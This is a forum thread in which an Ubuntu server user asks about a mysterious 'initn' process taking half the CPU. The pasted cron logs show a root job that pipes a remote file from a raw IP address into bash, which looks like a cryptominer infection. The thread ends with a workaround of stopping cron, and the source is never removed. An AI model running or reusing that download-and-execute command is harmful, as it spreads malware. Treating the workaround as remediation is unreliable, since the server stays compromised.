---
title: "ubuntu 18.04 server, &quot;./initn -t 2&quot; taking half of my cpu time"
date: 2019-01-11
forum: Server Platforms
---

### Post by pelgrim on 2019-01-11
hi,

I'm having problems with ubuntu 18.04 server.
After seeing glassfish fail each time withing a second after startup, with no trace in the logs,
I saw in the htop screen that there are ./initn -t 2 processes running.

Killing them has no effect, they return after a few seconds.
This takes 2/4 processors to 100%, and I suspect this problem must be linked at my glassfish process to vanish in thin air somehow.

So, first 2 questions:
- what is this initn process anyway ?
- how do I get rid of it ?

---

### Post by howefield on 2019-01-11
Thread moved to the "*Server Platforms*" forum.

---

### Post by pelgrim on 2019-01-11
Thank your for moving the topic.

I can confirm that this mysterious ./initn is the cause of my problems.
With htop running in one console and killing it at the right time, I'm able to run glassfish for about 30 seconds.
The moment initn pops up again, glassfish disappears without a trace and my 2/4 processors are working at full speed again.

the find command in my system didn't find any initn program.

Any help is welcome on how to deal with this.

---

### Post by pelgrim on 2019-01-13
Trying to get some attention to this problem.
Can't seem to find anything related to this, and kill command sometimes even result in 7 identical lines in the htop screen, but always 2/4 processors at 100% used by 2 of these processes.

Well, all my activities are stalled until this one is solved.

If it can help, I got this little bit of info
sudo strace -p <pid of initn>
gives an endless stream of the same lines:
"sched_yield()                           = 0"

I got the tip to try this
systemctl status <pid>

which produced this:
```

&#9679; cron.service - Regular background program processing daemon
   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
   Active: active (running) since Fri 2019-01-11 12:53:43 UTC; 2 days ago
     Docs: man:cron(8)
 Main PID: 1129 (cron)
    Tasks: 8 (limit: 3313)
   CGroup: /system.slice/cron.service
           &#9500;&#9472; 1129 /usr/sbin/cron -f
           &#9492;&#9472;13005 ./initn -t 2

Jan 13 14:54:01 pelgrimserver CRON[24037]: (root) CMD (curl -s http://192.227.186.154:7756/systemw.jpg | bash -s)
Jan 13 14:54:04 pelgrimserver CRON[24036]: (CRON) info (No MTA installed, discarding output)
Jan 13 14:54:04 pelgrimserver CRON[24036]: pam_unix(cron:session): session closed for user root
Jan 13 14:55:01 pelgrimserver CRON[24073]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 13 14:55:01 pelgrimserver CRON[24074]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 13 14:55:01 pelgrimserver CRON[24075]: (root) CMD (curl -s http://192.227.186.154:7756/systemw.jpg | bash -s)
Jan 13 14:55:01 pelgrimserver CRON[24076]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
Jan 13 14:55:01 pelgrimserver CRON[24073]: pam_unix(cron:session): session closed for user root
Jan 13 14:55:05 pelgrimserver CRON[24074]: (CRON) info (No MTA installed, discarding output)
Jan 13 14:55:05 pelgrimserver CRON[24074]: pam_unix(cron:session): session closed for user root

```

/lib/systemd/system/cron.service
```

[Unit]
Description=Regular background program processing daemon
Documentation=man:cron(8)

[Service]
EnvironmentFile=-/etc/default/cron
ExecStart=/usr/sbin/cron -f $EXTRA_OPTS
IgnoreSIGPIPE=false
KillMode=process

[Install]
WantedBy=multi-user.target

```

Can't kill cron and no idea what to do with it, but if someone of you know, I would love to hear from you.

---

### Post by pelgrim on 2019-01-14
forgot to update:
eventually was able to kill cron and the initn with:

sudo /etc/init.d/cron stop
sudo kill -15 <initn pid>

where this initn came from is still a mystery, I can not find anything in my file system with an initn command in it,
and for now I will have to stop cron and that initn job each time I reboot, which is lucky for me a rare thing.

---

